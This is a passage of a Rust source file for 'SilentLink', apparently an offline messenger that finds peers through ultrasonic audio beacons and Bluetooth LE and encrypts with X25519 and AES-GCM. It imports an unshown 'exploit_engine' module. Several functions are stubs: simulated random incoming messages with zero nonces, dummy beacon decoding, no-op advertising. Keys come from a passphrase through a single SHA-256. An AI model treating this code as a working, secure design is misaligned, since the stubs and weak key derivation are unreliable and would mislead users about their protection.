use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::sync::{RwLock, Mutex, mpsc};
use tokio::time::{interval, timeout, sleep};
use uuid::Uuid;
use serde::{Deserialize, Serialize};
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use aes_gcm::aead::{Aead, OsRng};
use sha2::{Sha256, Digest};
use hkdf::Hkdf;
use x25519_dalek::{EphemeralSecret, PublicKey};
use rand::RngCore;
use zeroize::ZeroizeOnDrop;
use thiserror::Error;
use tracing::{info, warn, error, debug, trace};
use btleplug::api::{Central, Manager as _, Peripheral as _, ScanFilter, WriteType};
use btleplug::platform::{Adapter, Manager, Peripheral};
use cpal::{Stream, StreamConfig};
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use rustfft::{FftPlanner, num_complex::Complex32};
use std::sync::atomic::{AtomicBool, Ordering};
use std::path::PathBuf;
use config::ConfigError;

mod exploit_engine;
mod platform;
mod wifi;
mod transport;
mod cli;
mod examples;

use exploit_engine::ExploitEngine;
use platform::{PlatformAdapter, create_platform_adapter, AudioStreamManager};
use wifi::WiFiConfig;
use transport::{TransportManager, TransportConfig, TransportType};
use cli::run_cli;


#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SilentLinkConfiguration {
    pub device_name: String,
    pub audio: AudioConfig,
    pub bluetooth: BluetoothConfig,
    pub wifi: WiFiConfig,
    pub transport: TransportConfig,
    pub crypto: CryptoConfig,
    pub mesh: MeshConfig,
    pub storage_path: Option<PathBuf>,
    pub enable_privileged_mode: bool,
    pub target_device_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AudioConfig {
    pub sample_rate: u32,
    pub channels: u16,
    pub buffer_size: usize,
    pub ultrasonic_freq_start: f32,
    pub ultrasonic_freq_end: f32,
    pub beacon_duration_ms: u64,
    pub beacon_interval_ms: u64,
    pub detection_threshold: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BluetoothConfig {
    pub service_uuid: String,
    pub characteristic_uuid: String,
    pub scan_timeout_ms: u64,
    pub connection_timeout_ms: u64,
    pub max_connections: usize,
}

impl Default for BluetoothConfig {
    fn default() -> Self {
        Self {
            service_uuid: "6ba7b810-9dad-11d1-80b4-00c04fd430c8".to_string(),
            characteristic_uuid: "6ba7b810-9dad-11d1-80b4-00c04fd430c8".to_string(),
            scan_timeout_ms: 30000,
            connection_timeout_ms: 10000,
            max_connections: 10,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CryptoConfig {
    pub key_rotation_interval_hours: u64,
    pub message_ttl_seconds: u64,
    pub max_hops: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MeshConfig {
    pub routing_update_interval_ms: u64,
    pub neighbour_timeout_seconds: u64,
    pub max_cached_messages: usize,
}

impl Default for SilentLinkConfiguration {
    fn default() -> Self {
        Self { 
            device_name: format!("SilentLink-{}", &Uuid::new_v4().to_string()[..8]), 
            audio: AudioConfig { 
                sample_rate: 44100, // More widely supported sample rate
                channels: 1, 
                buffer_size: 1024, // Start with smaller buffer size for better compatibility
                ultrasonic_freq_start: 18000.0, 
                ultrasonic_freq_end: 20000.0, // More conservative frequency range
                beacon_duration_ms: 100, 
                beacon_interval_ms: 5000, 
                detection_threshold: 0.1, 
            }, 
            bluetooth: BluetoothConfig { 
                service_uuid: "6ba7b810-9dad-11d1-80b4-00c04fd430c8".to_string(), 
                characteristic_uuid: "6ba7b810-9dad-11d1-80b4-00c04fd430c8".to_string(), 
                scan_timeout_ms: 30000, 
                connection_timeout_ms: 10000, 
                max_connections: 10, 
            },
            wifi: WiFiConfig::default(),
            transport: TransportConfig::default(),
            crypto: CryptoConfig {
                key_rotation_interval_hours: 24,
                message_ttl_seconds: 300,
                max_hops: 5,
            }, 
            mesh: MeshConfig { routing_update_interval_ms: 3000, 
                neighbour_timeout_seconds: 120, 
                max_cached_messages: 1000, 
            }, 
            storage_path: dirs::data_dir().map(|d| d.join("silentlink")),
            enable_privileged_mode: false,
            target_device_id: None,
        }
    }
}

#[derive(Error, Debug)]
pub enum SilentLinkError {
    #[error("Bluetooth error: {0}")]
    Bluetooth(#[from] btleplug::Error),
    #[error("Audio error: {0}")]
    Audio(String),
    #[error("Cryptographic error: {0}")]
    Crypto(String),
    #[error("Network error: {0}")]
    Network(String),
    #[error("Serialization error: {0}")]
    Serialization(#[from] serde_json::Error),
    #[error("Configuration error: {0}")]
    Config(#[from] ConfigError),
    #[error("Device not found: {0}")]
    DeviceNotFound(String),
    #[error("Invalid handshake")]
    InvalidHandshake,
    #[error("Message expired")]
    MessageExpired,
    #[error("Permission denied")]
    PermissionDenied,
    #[error("Timeout")]
    Timeout,
    #[error("System error: {0}")]
    System(String),
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}

pub type Result<T> = std::result::Result<T, SilentLinkError>;

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct DeviceId(pub Uuid);

impl DeviceId {
    pub fn new() -> Self {
        Self(Uuid::new_v4())
    }

    pub fn from_bytes(bytes: &[u8]) -> Option<Self> {
        Uuid::from_slice(bytes).ok().map(Self)
    }

    pub fn as_bytes(&self) -> &[u8; 16] {
        self.0.as_bytes()
    }
}

impl std::fmt::Display for DeviceId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", &self.0.to_string()[..8])
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, ZeroizeOnDrop)]
pub struct SharedSecret {
    #[zeroize(skip)]
    pub key_id: String,
    pub secret: [u8; 32],
}

impl SharedSecret {
    pub fn new(key_id: String) -> Self {
        let mut secret = [0u8; 32];
        OsRng.fill_bytes(&mut secret);
        Self { key_id, secret }
    }
    
    pub fn from_passphrase(key_id: String, passphrase: &str) -> Self {
        let mut hasher = Sha256::new();
        hasher.update(passphrase.as_bytes());
        hasher.update(key_id.as_bytes());
        let hash = hasher.finalize();
        
        let mut secret = [0u8; 32];
        secret.copy_from_slice(&hash);
        Self { key_id, secret }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MessageHeader {
    pub message_id: Uuid,
    pub sender_id: DeviceId,
    pub recipient_id: Option<DeviceId>,
    pub message_type: MessageType,
    pub ttl: u64,
    pub created_at: u64,
    pub hop_count: u8,
    pub max_hops: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum MessageType {
    DirectMessage,
    Broadcast,
    HandshakeRequest,
    HandshakeResponse,
    KeyExchange,
    Ping,
    Pong,
    Emergency,
    TopologyUpdate,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedMessage {
    pub header: MessageHeader,
    pub encrypted_payload: Vec<u8>,
    pub nonce: [u8; 12],
    pub signature: Option<Vec<u8>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlaintextMessage {
    pub content: String,
    pub metadata: HashMap<String, String>,
}

pub struct UltrasonicEngine {
    config: AudioConfig,
    device_id: DeviceId,
    shared_secrets: Arc<RwLock<HashMap<String, SharedSecret>>>,
    is_running: Arc<AtomicBool>,
    beacon_tx: Arc<Mutex<Option<mpsc::UnboundedSender<UltrasonicBeacon>>>>,
    stream_manager: Arc<Mutex<AudioStreamManager>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UltrasonicBeacon {
    pub device_id: DeviceId,
    pub handshake_token: Vec<u8>,
    pub timestamp: u64,
    pub signal_strength: Option<f32>,
}

impl UltrasonicEngine {
    pub fn new(
        config: AudioConfig,
        device_id: DeviceId,
        shared_secrets: Arc<RwLock<HashMap<String, SharedSecret>>>,
    ) -> Self {
        Self {
            config,
            device_id,
            shared_secrets,
            is_running: Arc::new(AtomicBool::new(false)),
            beacon_tx: Arc::new(Mutex::new(None)),
            stream_manager: Arc::new(Mutex::new(AudioStreamManager::new())),
        }
    }

    pub async fn start(&self) -> Result<mpsc::UnboundedReceiver<UltrasonicBeacon>> {
        if self.is_running.load(Ordering::Acquire) {
            return Err(SilentLinkError::System("Already running".to_string()));
        }

        let (beacon_tx, beacon_rx) = mpsc::unbounded_channel();
        *self.beacon_tx.lock().await = Some(beacon_tx.clone());

        self.is_running.store(true, Ordering::Release);

        // Try to start audio input/output streams, but don't fail if they're not available
        match self.start_audio_input(beacon_tx.clone()).await {
            Ok(input_stream) => {
                match self.start_audio_output().await {
                    Ok(output_stream) => {
                        // Store streams in the manager to prevent memory leaks
                        self.stream_manager.lock().await.set_streams(input_stream, output_stream);
                        info!("Ultrasonic engine started with full audio support");
                    }
                    Err(e) => {
                        warn!("Audio output failed, running in input-only mode: {}", e);
                        self.stream_manager.lock().await.set_input_stream(input_stream);
                    }
                }
            }
            Err(e) => {
                warn!("Audio system unavailable, running in silent mode: {}", e);
                info!("Ultrasonic engine will operate without audio hardware");
                // Continue without audio - the transport manager will handle WiFi/Bluetooth
            }
        }

        // Start beacon emission task (will generate beacons even without audio output)
        let config_clone = self.config.clone();
        let device_id_clone = self.device_id.clone();
        let shared_secrets_clone = self.shared_secrets.clone();
        let is_running_clone = self.is_running.clone();
        
        let emission_task = async move {
            let mut interval = interval(Duration::from_millis(config_clone.beacon_interval_ms));

            while is_running_clone.load(Ordering::Acquire) {
                interval.tick().await;

                // Create beacon
                let secrets = shared_secrets_clone.read().await;
                let handshake_token = if let Some(secret) = secrets.values().next() {
                    Self::generate_handshake_token_static(&secret.secret, &device_id_clone)
                } else {
                    Ok(vec![0u8; 8]) // Default token for open discovery
                };

                if let Ok(token) = handshake_token {
                    let beacon = UltrasonicBeacon {
                        device_id: device_id_clone.clone(),
                        handshake_token: token,
                        timestamp: SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .unwrap()
                            .as_secs(),
                        signal_strength: None,
                    };

                    let _beacon_samples = Self::generate_beacon_audio(&beacon, &config_clone);
                    trace!("Generated beacon with {} samples (audio may not be available)", _beacon_samples.len());
                    
                    // Note: In silent mode, beacons are generated but not output to audio
                    debug!("Generated ultrasonic beacon for device {}", device_id_clone);
                }
            }
        };
        tokio::spawn(emission_task);

        info!("Ultrasonic engine started successfully");
        Ok(beacon_rx)
    }

    async fn start_audio_input(&self, beacon_tx: mpsc::UnboundedSender<UltrasonicBeacon>) -> Result<Stream> {
        let host = cpal::default_host();
        let input_device = host.default_input_device()
            .ok_or_else(|| SilentLinkError::Audio("No input device available".to_string()))?;

        // Try multiple configurations in order of preference
        let configs_to_try = vec![
            // Primary config
            StreamConfig {
                channels: self.config.channels,
                sample_rate: cpal::SampleRate(self.config.sample_rate),
                buffer_size: cpal::BufferSize::Fixed(self.config.buffer_size as u32),
            },
            // Fallback with larger buffer for ALSA dmix compatibility
            StreamConfig {
                channels: self.config.channels,
                sample_rate: cpal::SampleRate(self.config.sample_rate),
                buffer_size: cpal::BufferSize::Fixed(8192),
            },
            // Fallback with default buffer size
            StreamConfig {
                channels: self.config.channels,
                sample_rate: cpal::SampleRate(self.config.sample_rate),
                buffer_size: cpal::BufferSize::Default,
            },
            // Conservative mono config for better compatibility
            StreamConfig {
                channels: 1,
                sample_rate: cpal::SampleRate(44100),
                buffer_size: cpal::BufferSize::Fixed(2048),
            },
            // Very conservative config
            StreamConfig {
                channels: 1,
                sample_rate: cpal::SampleRate(22050),
                buffer_size: cpal::BufferSize::Default,
            },
            // Last resort - minimal config
            StreamConfig {
                channels: 1,
                sample_rate: cpal::SampleRate(16000),
                buffer_size: cpal::BufferSize::Default,
            },
        ];

        let device_id = self.device_id.clone();
        let audio_config = self.config.clone();
        let shared_secrets = self.shared_secrets.clone();
        let is_running = self.is_running.clone();

        for (i, config) in configs_to_try.iter().enumerate() {
            let device_id_clone = device_id.clone();
            let audio_config_clone = audio_config.clone();
            let shared_secrets_clone = shared_secrets.clone();
            let is_running_clone = is_running.clone();
            let beacon_tx_clone = beacon_tx.clone();
            
            match input_device.build_input_stream(
                config,
                move |data: &[f32], _: &cpal::InputCallbackInfo| {
                    if !is_running_clone.load(Ordering::Acquire) {
                        return;
                    }

                    // Process audio data for ultrasonic beacons
                    if let Some(beacon) = Self::detect_ultrasonic_beacon(
                        data,
                        &audio_config_clone,
                        &device_id_clone,
                        &shared_secrets_clone,
                    ) {
                        let _ = beacon_tx_clone.send(beacon);
                    }
                },
                |err| error!("Audio input error: {}", err),
                None,
            ) {
                Ok(stream) => {
                    info!("Audio input initialized with config #{} (sample_rate: {}, buffer_size: {:?})", 
                          i + 1, config.sample_rate.0, config.buffer_size);
                    stream.play().map_err(|e| SilentLinkError::Audio(e.to_string()))?;
                    return Ok(stream);
                }
                Err(e) => {
                    warn!("Audio config #{} failed: {}", i + 1, e);
                    if i == configs_to_try.len() - 1 {
                        return Err(SilentLinkError::Audio(format!("All audio configurations failed. Last error: {}", e)));
                    }
                }
            }
        }

        Err(SilentLinkError::Audio("Failed to create audio input stream with any configuration".to_string()))
    }

    async fn start_audio_output(&self) -> Result<Stream> {
        let host = cpal::default_host();
        let output_device = host.default_output_device()
            .ok_or_else(|| SilentLinkError::Audio("No output device available".to_string()))?;

        // Try multiple configurations in order of preference
        let configs_to_try = vec![
            // Primary config
            StreamConfig {
                channels: self.config.channels,
                sample_rate: cpal::SampleRate(self.config.sample_rate),
                buffer_size: cpal::BufferSize::Fixed(self.config.buffer_size as u32),
            },
            // Fallback with larger buffer for ALSA dmix compatibility
            StreamConfig {
                channels: self.config.channels,
                sample_rate: cpal::SampleRate(self.config.sample_rate),
                buffer_size: cpal::BufferSize::Fixed(8192),
            },
            // Fallback with default buffer size
            StreamConfig {
                channels: self.config.channels,
                sample_rate: cpal::SampleRate(self.config.sample_rate),
                buffer_size: cpal::BufferSize::Default,
            },
            // Conservative mono config for better compatibility
            StreamConfig {
                channels: 1,
                sample_rate: cpal::SampleRate(44100),
                buffer_size: cpal::BufferSize::Fixed(2048),
            },
            // Very conservative config
            StreamConfig {
                channels: 1,
                sample_rate: cpal::SampleRate(22050),
                buffer_size: cpal::BufferSize::Default,
            },
            // Last resort - minimal config
            StreamConfig {
                channels: 1,
                sample_rate: cpal::SampleRate(16000),
                buffer_size: cpal::BufferSize::Default,
            },
        ];

        let _audio_config = self.config.clone();
        let is_running = self.is_running.clone();
        let current_beacon = Arc::new(Mutex::new(None::<Vec<f32>>));

        for (i, config) in configs_to_try.iter().enumerate() {
            let is_running_clone = is_running.clone();
            let current_beacon_clone = current_beacon.clone();
            
            match output_device.build_output_stream(
                config,
                move |data: &mut [f32], _: &cpal::OutputCallbackInfo| {
                    if !is_running_clone.load(Ordering::Acquire) {
                        data.fill(0.0);
                        return;
                    }

                    // Output current beacon if available
                    if let Ok(mut beacon_guard) = current_beacon_clone.try_lock() {
                        if let Some(ref mut beacon_samples) = *beacon_guard {
                            let samples_to_copy = data.len().min(beacon_samples.len());
                            data[..samples_to_copy].copy_from_slice(&beacon_samples[..samples_to_copy]);
                            
                            if samples_to_copy < data.len() {
                                data[samples_to_copy..].fill(0.0);
                            }
                            
                            beacon_samples.drain(..samples_to_copy);
                            if beacon_samples.is_empty() {
                                *beacon_guard = None;
                            }
                        } else {
                            data.fill(0.0);
                        }
                    } else {
                        data.fill(0.0);
                    }
                },
                |err| error!("Audio output error: {}", err),
                None,
            ) {
                Ok(stream) => {
                    info!("Audio output initialized with config #{} (sample_rate: {}, buffer_size: {:?})", 
                          i + 1, config.sample_rate.0, config.buffer_size);
                    stream.play().map_err(|e| SilentLinkError::Audio(e.to_string()))?;
                    return Ok(stream);
                }
                Err(e) => {
                    warn!("Audio output config #{} failed: {}", i + 1, e);
                    if i == configs_to_try.len() - 1 {
                        return Err(SilentLinkError::Audio(format!("All audio output configurations failed. Last error: {}", e)));
                    }
                }
            }
        }

        Err(SilentLinkError::Audio("Failed to create audio output stream with any configuration".to_string()))
    }

    #[allow(dead_code)]
    async fn create_beacon(&self) -> Result<UltrasonicBeacon> {
        let secrets = self.shared_secrets.read().await;
        let handshake_token = if let Some(secret) = secrets.values().next() {
            self.generate_handshake_token(&secret.secret)?
        } else {
            vec![0u8; 8] 
        };

        Ok(UltrasonicBeacon {
            device_id: self.device_id.clone(),
            handshake_token,
            timestamp: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            signal_strength: None,
        })
    }

    fn generate_beacon_audio(beacon: &UltrasonicBeacon, config: &AudioConfig) -> Vec<f32> {
        let duration_samples = (config.sample_rate as f32 * config.beacon_duration_ms as f32 / 1000.0) as usize;
        let mut samples = vec![0.0f32; duration_samples];
        
        // Encode device ID in frequency shifts
        let device_bytes = beacon.device_id.as_bytes();
        let freq_step = (config.ultrasonic_freq_end - config.ultrasonic_freq_start) / 256.0;
        
        for (i, sample) in samples.iter_mut().enumerate() {
            let byte_idx = (i * device_bytes.len()) / duration_samples;
            let byte_val = device_bytes[byte_idx % device_bytes.len()];
            let frequency = config.ultrasonic_freq_start + (byte_val as f32 * freq_step);
            
            let t = i as f32 / config.sample_rate as f32;
            *sample = 0.1 * (2.0 * std::f32::consts::PI * frequency * t).sin();
        }
        
        samples
    }

    fn detect_ultrasonic_beacon(
        audio_data: &[f32],
        config: &AudioConfig,
        device_id: &DeviceId,
        _shared_secrets: &Arc<RwLock<HashMap<String, SharedSecret>>>,
    ) -> Option<UltrasonicBeacon> {
        // Simple frequency analysis to detect beacons
        if audio_data.len() < 1024 {
            return None;
        }

        // FFT analysis
        let mut planner = FftPlanner::new();
        let fft = planner.plan_fft_forward(audio_data.len());
        
        let mut buffer: Vec<Complex32> = audio_data
            .iter()
            .map(|&x| Complex32::new(x, 0.0))
            .collect();
        
        fft.process(&mut buffer);

        // Check for ultrasonic frequencies
        let freq_resolution = config.sample_rate as f32 / audio_data.len() as f32;
        let start_bin = (config.ultrasonic_freq_start / freq_resolution) as usize;
        let end_bin = (config.ultrasonic_freq_end / freq_resolution) as usize;

        let ultrasonic_power: f32 = buffer[start_bin..end_bin.min(buffer.len())]
            .iter()
            .map(|c| c.norm_sqr())
            .sum();

        if ultrasonic_power > config.detection_threshold {
            // Detected potential beacon - decode device ID
            let mut max_bin = start_bin;
            let mut max_power = 0.0f32;
            
            for (i, bin) in buffer[start_bin..end_bin.min(buffer.len())].iter().enumerate() {
                let power = bin.norm_sqr();
                if power > max_power {
                    max_power = power;
                    max_bin = start_bin + i;
                }
            }
            
            // Very simplified decoding - in practice, you'd need more sophisticated signal processing
            let detected_frequency = max_bin as f32 * freq_resolution;
            let byte_val = ((detected_frequency - config.ultrasonic_freq_start) * 256.0 
                / (config.ultrasonic_freq_end - config.ultrasonic_freq_start)) as u8;
            
            // Create a dummy device ID based on detected frequency
            let mut device_bytes = [0u8; 16];
            device_bytes[0] = byte_val;
            
            if let Some(detected_device_id) = DeviceId::from_bytes(&device_bytes) {
                if detected_device_id != *device_id {
                    return Some(UltrasonicBeacon {
                        device_id: detected_device_id,
                        handshake_token: vec![byte_val],
                        timestamp: SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .unwrap()
                            .as_secs(),
                        signal_strength: Some(ultrasonic_power.sqrt()),
                    });
                }
            }
        }

        None
    }

    #[allow(dead_code)]
    fn generate_handshake_token(&self, secret: &[u8]) -> Result<Vec<u8>> {
        Self::generate_handshake_token_static(secret, &self.device_id)
    }

    fn generate_handshake_token_static(secret: &[u8], device_id: &DeviceId) -> Result<Vec<u8>> {
        let mut hasher = Sha256::new();
        hasher.update(secret);
        hasher.update(device_id.0.as_bytes());
        Ok(hasher.finalize()[..8].to_vec())
    }

    pub async fn stop(&self) {
        self.is_running.store(false, Ordering::Release);
        *self.beacon_tx.lock().await = None;
        
        // Clean up audio streams properly
        self.stream_manager.lock().await.stop_streams();
        
        info!("Ultrasonic engine stopped");
    }
}

pub struct BluetoothManager {
    config: BluetoothConfig,
    device_id: DeviceId,
    adapter: Option<Adapter>,
    active_connections: Arc<RwLock<HashMap<DeviceId, BluetoothConnection>>>,
    is_running: Arc<AtomicBool>,
}

#[derive(Debug, Clone)]
pub struct BluetoothConnection {
    pub device_id: DeviceId,
    pub peripheral: Peripheral,
    pub connected_at: SystemTime,
    pub last_activity: Arc<RwLock<SystemTime>>,
}

impl BluetoothManager {
    pub async fn new(config: BluetoothConfig, device_id: DeviceId) -> Result<Self> {
        let manager = Manager::new().await?;
        let adapters = manager.adapters().await?;
        let adapter = adapters.into_iter().next();

        if adapter.is_none() {
            return Err(SilentLinkError::System("No Bluetooth adapter available".to_string()));
        }

        Ok(Self {
            config,
            device_id,
            adapter,
            active_connections: Arc::new(RwLock::new(HashMap::new())),
            is_running: Arc::new(AtomicBool::new(false)),
        })
    }

    pub async fn start(&self) -> Result<(mpsc::UnboundedReceiver<DeviceId>, mpsc::UnboundedReceiver<EncryptedMessage>)> {
        if self.is_running.load(Ordering::Acquire) {
            return Err(SilentLinkError::System("Already running".to_string()));
        }

        let (device_tx, device_rx) = mpsc::unbounded_channel();
        let (message_tx, message_rx) = mpsc::unbounded_channel();

        self.is_running.store(true, Ordering::Release);

        // Start advertising
        self.start_advertising().await?;

        // Start scanning
        let config_clone = self.config.clone();
        let adapter_clone = self.adapter.clone();
        let is_running_clone = self.is_running.clone();
        
        let scan_task = async move {
            if let Some(adapter) = adapter_clone {
                let service_uuid = uuid::Uuid::parse_str(&config_clone.service_uuid)
                    .map_err(|e| SilentLinkError::System(e.to_string()));

                if let Ok(service_uuid) = service_uuid {
                    while is_running_clone.load(Ordering::Acquire) {
                        info!("Starting BLE scan...");
                        
                        if adapter.start_scan(ScanFilter {
                            services: vec![service_uuid],
                        }).await.is_ok() {
                            sleep(Duration::from_millis(config_clone.scan_timeout_ms)).await;

                            if let Ok(peripherals) = adapter.peripherals().await {
                                for peripheral in peripherals {
                                    if let Ok(Some(properties)) = peripheral.properties().await {
                                        if let Some(name) = properties.local_name {
                                            if name.starts_with("SilentLink-") {
                                                // Extract device ID from name
                                                if let Some(id_part) = name.strip_prefix("SilentLink-") {
                                                    if let Ok(uuid) = Uuid::parse_str(&format!("{}-0000-0000-0000-000000000000", id_part)) {
                                                        let device_id = DeviceId(uuid);
                                                        let _ = device_tx.send(device_id);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                            let _ = adapter.stop_scan().await;
                        }
                        sleep(Duration::from_secs(5)).await;
                    }
                }
            }
            Ok::<(), SilentLinkError>(())
        };
        tokio::spawn(scan_task);

        // Start message receiving
        let device_id_clone = self.device_id.clone();
        let active_connections_clone = self.active_connections.clone();
        let is_running_clone = self.is_running.clone();
        
        let receive_task = async move {
            // This would handle incoming BLE notifications/indications
            // For now, simulate periodic message reception
            let mut interval = interval(Duration::from_secs(10));

            while is_running_clone.load(Ordering::Acquire) {
                interval.tick().await;

                // Check all active connections for new messages
                let connections = active_connections_clone.read().await;
                for connection in connections.values() {
                    // In real implementation, this would read from BLE characteristics
                    if rand::random::<f32>() < 0.1 {
                        let dummy_message = EncryptedMessage {
                            header: MessageHeader {
                                message_id: Uuid::new_v4(),
                                sender_id: connection.device_id.clone(),
                                recipient_id: Some(device_id_clone.clone()),
                                message_type: MessageType::DirectMessage,
                                ttl: 300,
                                created_at: SystemTime::now()
                                    .duration_since(UNIX_EPOCH)
                                    .unwrap()
                                    .as_secs(),
                                hop_count: 0,
                                max_hops: 5,
                            },
                            encrypted_payload: b"simulated_encrypted_message".to_vec(),
                            nonce: [0u8; 12],
                            signature: None,
                        };

                        let _ = message_tx.send(dummy_message);
                    }
                }
            }
            Ok::<(), SilentLinkError>(())
        };
        tokio::spawn(receive_task);

        info!("Bluetooth manager started");
        Ok((device_rx, message_rx))
    }

    async fn start_advertising(&self) -> Result<()> {
        // Note: btleplug doesn't support advertising on all platforms
        // This would need platform-specific implementation
        info!("Starting BLE advertising (platform-specific implementation needed)");
        Ok(())
    }

    pub async fn connect_to_device(&self, target_device_id: DeviceId) -> Result<()> {
        let adapter = self.adapter.as_ref().unwrap();
        let peripherals = adapter.peripherals().await?;

        for peripheral in peripherals {
            if let Ok(Some(properties)) = peripheral.properties().await {
                if let Some(name) = properties.local_name {
                    if name == format!("SilentLink-{}", &target_device_id.0.to_string()[..8]) {
                        info!("Connecting to device: {}", target_device_id);
                        
                        let connect_result = timeout(
                            Duration::from_millis(self.config.connection_timeout_ms),
                            peripheral.connect()
                        ).await;

                        match connect_result {
                            Ok(Ok(())) => {
                                let connection = BluetoothConnection {
                                    device_id: target_device_id.clone(),
                                    peripheral,
                                    connected_at: SystemTime::now(),
                                    last_activity: Arc::new(RwLock::new(SystemTime::now())),
                                };

                                self.active_connections
                                    .write()
                                    .await
                                    .insert(target_device_id.clone(), connection);

                                info!("Successfully connected to device: {}", target_device_id);
                                return Ok(());
                            }
                            Ok(Err(e)) => return Err(e.into()),
                            Err(_) => return Err(SilentLinkError::Timeout),
                        }
                    }
                }
            }
        }

        Err(SilentLinkError::DeviceNotFound(target_device_id.to_string()))
    }

    pub async fn send_message(
        &self,
        target_device_id: &DeviceId,
        message: &EncryptedMessage,
    ) -> Result<()> {
        let connections = self.active_connections.read().await;
        
        if let Some(connection) = connections.get(target_device_id) {
            let serialized = serde_json::to_vec(message)?;
            
            // In real implementation, this would write to the BLE characteristic
            let char_uuid = uuid::Uuid::parse_str(&self.config.characteristic_uuid)
                .map_err(|e| SilentLinkError::System(e.to_string()))?;

            // Discover services and characteristics
            connection.peripheral.discover_services().await?;
            let characteristics = connection.peripheral.characteristics();
            
            if let Some(char) = characteristics.iter().find(|c| c.uuid == char_uuid) {
                connection.peripheral.write(char, &serialized, WriteType::WithoutResponse).await?;
                
                // Update last activity
                *connection.last_activity.write().await = SystemTime::now();
                
                debug!("Sent {} bytes to device {}", serialized.len(), target_device_id);
                Ok(())
            } else {
                Err(SilentLinkError::System("Characteristic not found".to_string()))
            }
        } else {
            Err(SilentLinkError::DeviceNotFound(target_device_id.to_string()))
        }
    }

    pub async fn disconnect_device(&self, device_id: &DeviceId) -> Result<()> {
        let mut connections = self.active_connections.write().await;
        
        if let Some(connection) = connections.remove(device_id) {
            connection.peripheral.disconnect().await?;
            info!("Disconnected from device: {}", device_id);
        }
        
        Ok(())
    }

    pub async fn cleanup_stale_connections(&self) -> Result<()> {
        let mut connections = self.active_connections.write().await;
        let cutoff = SystemTime::now() - Duration::from_secs(300); // 5 minutes
        
        let stale_devices: Vec<DeviceId> = connections
            .iter()
            .filter_map(|(id, conn)| {
                if *conn.last_activity.try_read().ok()? < cutoff {
                    Some(id.clone())
                } else {
                    None
                }
            })
            .collect();

        for device_id in stale_devices {
            if let Some(connection) = connections.remove(&device_id) {
                let _ = connection.peripheral.disconnect().await;
                info!("Cleaned up stale connection to: {}", device_id);
            }
        }

        Ok(())
    }

    pub async fn stop(&self) {
        self.is_running.store(false, Ordering::Release);
        
        let mut connections = self.active_connections.write().await;
        for (device_id, connection) in connections.drain() {
            let _ = connection.peripheral.disconnect().await;
            info!("Disconnected from device during shutdown: {}", device_id);
        }

        if let Some(adapter) = &self.adapter {
            let _ = adapter.stop_scan().await;
        }

        info!("Bluetooth manager stopped");
    }

    pub async fn get_connected_devices(&self) -> Vec<DeviceId> {
        self.active_connections.read().await.keys().cloned().collect()
    }
}

pub struct CryptoEngine {
    device_private_key: Arc<RwLock<EphemeralSecret>>,
    device_public_key: Arc<RwLock<PublicKey>>,
    old_keypair: Arc<RwLock<Option<(EphemeralSecret, PublicKey)>>>,
    shared_secrets: Arc<RwLock<HashMap<String, SharedSecret>>>,
    session_keys: Arc<RwLock<HashMap<DeviceId, [u8; 32]>>>,
    #[allow(dead_code)]
    config: CryptoConfig,
}

impl CryptoEngine {
    pub fn new(shared_secrets: Arc<RwLock<HashMap<String, SharedSecret>>>, config: CryptoConfig) -> Self {
        let private_key = EphemeralSecret::random_from_rng(OsRng);
        let public_key = PublicKey::from(&private_key);
        
        Self {
            device_private_key: Arc::new(RwLock::new(private_key)),
            device_public_key: Arc::new(RwLock::new(public_key)),
            old_keypair: Arc::new(RwLock::new(None)),
            shared_secrets,
            session_keys: Arc::new(RwLock::new(HashMap::new())),
            config,
        }
    }

    pub async fn get_public_key(&self) -> PublicKey {
        *self.device_public_key.read().await
    }

    pub async fn encrypt_message(
        &self,
        message: &PlaintextMessage,
        recipient_id: Option<&DeviceId>,
        header: MessageHeader,
    ) -> Result<EncryptedMessage> {
        let plaintext = serde_json::to_vec(message)?;
        
        // Derive encryption key
        let encryption_key = self.derive_message_key(recipient_id).await?;
        
        // Generate random nonce
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        // Encrypt the message
        let cipher = Aes256Gcm::new_from_slice(&encryption_key)
            .map_err(|e| SilentLinkError::Crypto(e.to_string()))?;
        
        let encrypted_payload = cipher
            .encrypt(nonce, plaintext.as_ref())
            .map_err(|e| SilentLinkError::Crypto(e.to_string()))?;
        
        Ok(EncryptedMessage {
            header,
            encrypted_payload,
            nonce: nonce_bytes,
            signature: None,
        })
    }

    pub async fn decrypt_message(
        &self,
        encrypted_message: &EncryptedMessage,
    ) -> Result<PlaintextMessage> {
        // Check TTL
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        if encrypted_message.header.created_at + encrypted_message.header.ttl < now {
            return Err(SilentLinkError::MessageExpired);
        }

        // Derive decryption key
        let decryption_key = self
            .derive_message_key(encrypted_message.header.recipient_id.as_ref())
            .await?;
        
        let nonce = Nonce::from_slice(&encrypted_message.nonce);
        
        let cipher = Aes256Gcm::new_from_slice(&decryption_key)
            .map_err(|e| SilentLinkError::Crypto(e.to_string()))?;
        
        let decrypted_payload = cipher
            .decrypt(nonce, encrypted_message.encrypted_payload.as_ref())
